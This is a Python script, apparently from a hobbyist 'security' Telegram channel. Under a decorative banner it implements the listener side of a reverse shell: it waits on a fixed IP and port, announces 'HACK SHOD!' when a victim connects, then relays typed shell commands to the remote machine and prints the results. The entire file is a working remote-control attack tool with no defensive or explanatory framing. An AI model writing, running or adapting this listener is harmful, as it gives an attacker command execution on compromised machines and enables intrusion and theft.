#TYPED PYTHON_3
#creator: @e_l_f_6_6_6

import socket, os
from colorama import Fore ,Back ,Style  

if os.name == 'nt':
	os.system('cls')
else:
	os.system('clear')
#banner    
print(Back.WHITE+Fore.BLACK+Style.BRIGHT+"""
                                    # elf #                                  
                               .7KBQBBBBBBBBBIr                              
                            i5RQQP1ri..   ..i7IbQQM2i                        
                        rQBBDY.                   .JgBBMr                    
                     rBQB7                             vBBBi                 
                   PBBr                                   vBQI               
                 ZBD.                                       .QBX             
               IBg                                             BBv           
              BB.                                               .BB          
            vBY      qq.       ...:r::i.::i::i:..        :dI      XBi        
           DB     :BBR      ..: .:.  :  : ..  ::....       BBB.    .B2       
          BB   g:1BBi     .r:   .   ..  :  :.   .   :i.     7BQ7rd   Bb      
         gB   BE.BIi:   .:. ..:i.   i   i   :   .i:.. .:.   i:PB BB   BI     
        YB   BB :iIB   :.    ..  ..:: dd7BQ:.:..  ..    .:  .BJi. Qd   Bi    
        B  B BQ QBB   i     .:     :  BR XBB .     :.     i   BBD BB.B :B    
       BM PB BQBU:   :      i      i    :BM  i      i      i   iXBBB Bv BB   
      .B  BB Qu P7  i....  :.     ..    X    :      ..  ....i  u1 qg BB  B   
      BB  BB  rBB  i    ...i....  :.   .5    :. .....i...    :  BBi .BB  Bj  
      B   BB DBZ  .:      ..   .i...# elf #...: .    :       :   BBI.BZ  iB  
     jQ Y: BQB..  :       :.      :           .      ..      .:   :BMB Y: B  
     BB MB RB  B  i       :       .   rEXEi   .       :       :  B  BS B1 B  
     BZ vB: : BP  i.......:        1B .QBd  Bv       .:.......:  BB r vB: B  
     BM  BB  BB   i . . . :  .:rUZBBB  rB:  BBBE1i:.  : ... . i   BB .BB  B  
     BB  KBgiBY   :        rBBBBBBQB.   Q   iBBBBBBBBi        :   KB:BBL  B  
     vB L YBBB Qi :        BBBBQBBBB:  5B7  7BBBBBBBBZ       .: LK BQQi r B  
      B rB  BR Bd  :       BQBQBQBBBQ  MQS  QBQBBBBBBB       :  BB BB  B.:B  
      QQ BB. : QB  :    . :BBBBBBBBBB7 bBs 5BBBBBBBBBB. .   ..  BB i :BB BY  
       B  BBB  BQ i :...  :BBBBBQBBBBB:KBJiBBBBBBBBBBB   ..:. r BB  BBQ  B   
       BB  uBBiBB Bj .    PBBQBBBBBQBBBBBQBBBBBBBQBQBBJ    . dB BRrBB7  BQ   
        B. 7 vBBQ rB: .   QBBBBBBBBBBBBBQBBBBBBBBBBBBBZ   . 7B..BBBr 7 7B    
        7B iB.  K5 BB     BQBBBBBQBQBBBBBBBQBBBBBBBBBBB     BB D1  iB. Q:    
         bQ .BBP:: YBd 5  BBQBBBBBBBQBQBBBQBBBBBQBBBBBB  X BBi ::gBB  BJ     
          gB  rBBBBrZB.uB7BBBBBBBBBQBBBBBQBBBQBBBBBBBQBrBi:QqrBBBQ:  BI      
           KB.  ivqBMBB 1BBBBBBBBBBBBBBBBBBBBBBBBBBBBBQB7 BBMBSvi  :BY       
            rQ5 .u7:. :r .KQBBBBBBBBBQBQBBBBBBBBBBBQBQS  7: .:vJ  DB:        
              QB  iBBBBBBBBBQKrQQBBBBBBBBBBBBBBBQZrPQBBBBBBBBQ: .BB          
               7Bg   :i:..    iQBBBBBBBQBQBBBBBBBRi    ..:r.   BBi           
                 XBR  .2ZQBBBBBBQBBBBBBBBBBBBBBBQBBBBBBQE1. .BBu             
                   uBQi  .r7i  BBQBBBBBQBBBBBBBBBQ .rri.  rBBv               
                     :gBgi     BQBBBBBBBQBBBBBBBBB     rMBZ.                 
                        idBBgrJBBBBBBBBBBBBBBBBBBB77QBBP:                    
                            .rv1XZMQQBBBBBBBQQgZSu7i                         
                                      bay                                    
                                                                          """)
print(Back.BLACK+"\n")
print(f"{Fore.RED}[+]{Fore.LIGHTGREEN_EX+Style.BRIGHT+Back.BLACK}creator => @e_l_f_6_6_6\n\n\n{Fore.YELLOW}[+]{Fore.GREEN+Back.BLACK+Style.DIM}my channel_telegram : @elf_security_cyber")

HOST = "192.168.1.34"
PORT = 8080
B_SIZE = 1024 * 128
SEPARATOR = "_elf_"
s = socket.socket()

s.bind((HOST, PORT))
s.listen(5)

print(f"\n\n{Fore.RED+Back.BLACK}[+]{Fore.GREEN+Back.BLACK+Style.BRIGHT} dar hal shonod in SERVER_PORT [&] SERVER_IP ==> {Fore.YELLOW+Style.BRIGHT+Back.BLACK}[{HOST}:{PORT}]\n")

c_socket, c_address = s.accept()

print(f"{Fore.GREEN+Style.BRIGHT}[+]{Fore.GREEN+Back.BLACK+Style.BRIGHT} {c_address[0]} motasel shod!\n\n{Fore.RED} HACK SHOD! \n {Fore.RED}[+]{Fore.GREEN+Style.DIM}ENTER THE COMMEND TERMONAL!")

cwd = c_socket.recv(B_SIZE).decode()
print(f"{Fore.RED+Style.BRIGHT}[+]{Fore.GREEN+Back.BLACK+Style.BRIGHT} masir shell_kode ==>{Fore.CYAN+Style.BRIGHT}", cwd)
print(end='\n')

while True:
    c = input(f"{Fore.GREEN+Style.BRIGHT}{cwd}{Fore.WHITE+Style.BRIGHT} $ ")

    if not c.strip():

        continue

    c_socket.send(c.encode())

    if c.lower() == "exit":

        break
    out = c_socket.recv(B_SIZE).decode()
    
    res, cwd = out.split(SEPARATOR)
    
    print(res)
